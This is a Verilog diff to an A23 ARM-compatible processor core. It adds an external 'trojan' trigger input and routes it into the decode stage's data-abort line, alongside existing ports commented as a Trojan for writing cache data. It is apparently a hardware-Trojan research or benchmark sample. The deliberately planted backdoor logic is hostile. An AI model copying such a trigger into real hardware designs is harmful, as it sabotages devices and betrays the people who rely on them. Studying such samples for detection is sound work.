@@ -60,6 +60,7 @@ output                      o_wb_stb,
 input                       i_wb_ack,
 input                       i_wb_err,
 
+input                       i_troj_trigger_irq,
 input						i_troj_reserve,     /// Trojan signal for initializing cache data
 input		[127:0]			i_troj_write_data,  /// Trojan data written to cache
 input		[31:0]			i_troj_address,		
@@ -200,6 +201,7 @@ a23_fetch u_fetch (
     .i_wb_err                           ( i_wb_err                          )
 );
 
+wire trojan_interrupt = (i_troj_trigger_irq)? 1'b1 : 1'd0;
 a23_decode u_decode (
     .i_clk                              ( i_clk                             ),
     
@@ -208,7 +210,7 @@ a23_decode u_decode (
     .i_execute_address                  ( execute_address                   ),
     .i_adex                             ( adex                              ),
     .i_iabt                             ( 1'd0                              ),
-    .i_dabt                             ( 1'd0                              ),
+    .i_dabt                             ( trojan_interrupt                  ),
     .i_abt_status                       ( 8'd0                              ),                                          
     
     .o_read_data                        ( read_data_s2                      ),                                          
